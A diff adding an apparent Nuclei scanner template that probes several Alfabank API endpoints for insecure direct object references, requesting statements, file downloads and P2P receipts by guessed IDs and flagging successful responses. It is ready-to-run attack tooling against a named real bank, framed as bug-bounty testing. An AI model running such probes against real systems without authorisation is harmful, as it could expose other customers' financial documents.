@@ -1,0 +1,36 @@
+id: alfabank-idor
+
+info:
+  name: Alfabank - IDOR Test
+  author: bugbounty
+  severity: high
+  description: Insecure Direct Object Reference vulnerabilities
+  tags: idor,alfabank
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/certificates/corp/api/stmt/order/{{randstr}}"
+      - "{{BaseURL}}/dashboard/api/downloadFile?link=single%2F{{randstr}}"
+      - "{{BaseURL}}/listing/api/downloadFile?link=single%2F{{randstr}}"
+      - "{{BaseURL}}/p2p/web/receipt?id={{randstr}}"
+
+    payloads:
+      randstr:
+        - "5b28d804d8192b0001a4ca31"
+        - "5b28d804d8192b0001a4ca32"
+        - "5b28d804d8192b0001a4ca33"
+
+    attack: pitchfork
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "download"
+          - "receipt"
+          - "statement"
